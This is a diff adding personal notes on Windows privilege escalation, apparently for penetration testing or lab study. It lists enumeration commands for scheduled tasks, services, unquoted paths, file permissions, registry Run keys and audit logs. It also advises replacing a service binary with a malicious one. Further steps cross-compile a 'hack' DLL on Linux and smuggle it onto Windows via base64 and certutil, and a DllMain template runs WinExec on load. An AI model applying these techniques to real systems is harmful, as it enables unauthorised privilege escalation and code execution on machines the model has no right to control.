@@ -1,0 +1,96 @@
+Windows Priv Meth
+
+
+====Show Hidden Files====
+Make sure I can see hidden files
+
+
+====Check Schedule tasks====
+
+Gui: Task Sch
+schtasks /query /fo LIST /v
+schtasks /query /fo LIST /v | Select-String -Pattern "Task to Run"
+schtasks /query /fo LIST /v | Select-String -Pattern "Task to Run" | find /i /v "com handler"
+
+
+====Check processes====
+tasklist /v
+query session
+Wmic process get name,processid,parentprocessid,sessionid
+Wmic process where (processid=1688) list full
+tasklist /svc | findstr /i "1688"
+where /R c:\ putty			(space after c:\)
+(*** show our permissions ) net user user
+Icacls C:\Program Files\7-Zip\7z.exe
+DLL NAME = SSPICLI.DLL
+
+(====Check Services====
+Services.msc  ( look for services with no description )
+for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
+sc qc testservice2
+Icacls C:\Program Files\7-Zip\7z.exe
+
+(replace binary with malicious binary and reboot)
+
+====Check Registry====
+HKLM RUN AND RUN ONCE
+HKCU RUN AND RUN ONCE
+
+====Auditing====
+auditpol /get /category:*    (MUST BE ADMIN TO USE)
+auditpol /get /category:* |findstr /i "success failure"
+wevtutil qe security /c:5 /rd:true /f:text
+wevtutil qe system /c:5 /rd:false /f:text /q:"*[System[(EventID=104 or EventID=7040)]]"
+wevtutil qe system /c:5 /rd:false /f:text /q:"*[System[(EventID=7045)]]"
+
+
+%systemroot%\system32\wbem\Logs\``
+
+reg query hklm\software\microsoft\powershell\3\powershellengine\
+reg query hklm\software\microsoft\wbem\cimom \| findstr /i logging
+    # 0 = no | 1 = errors | 2 = verbose
+
+
+
+
+
+Creating DLLs in on Linux and Transferring them to Windows
+
+#Building a DLL in Linux
+
+apt-get install mingw-w64 mingw-w64-common mingw-w64-i686-dev mingw-w64-tools mingw-w64-tools mingw-w64-x86-64-dev -y
+
+Or if issue with first command
+
+sudo apt-get install gcc-mingw-w64-x86-64 g++-mingw-w64-x86-64 wine64
+
+
+i686-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL hack.c
+
+i686-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a
+#Transferring a DLL to Windows from Linux without SSH,FTP,SFTP,or Python
+1. Run base64 [dll.name] > base64_dll
+2. Run md5sum base64_dll to create a MD5 hash of the dll. This will be used to validate the decoded .dll on Windows.
+3. Open base64_dll in gedit and Ctrl+A and Ctrl+C the document to copy the code
+4. Open an xfreerdp session to Windows using +clipboard
+5. Copy the text into a text file on Windows. ( base64.txt )
+6. Remove the .txt file extension using the move command on the commandline. ( move base64.txt base64 )
+7. Run certutil -decode base64 whatevervulndll.dll to decode the file that was copied
+8. Run certutil -hashfile to check the hash of the .dll compared to what it was on Linux prior to copying it.
+
+
+
+
+#include <windows.h>
+int execCommand()
+{
+ WinExec("", 1);
+ WinExec("", 1);
+ WinExec("", 1);
+ return 0; }
+BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
+{
+ execCommand();
+ return 0;
+ }
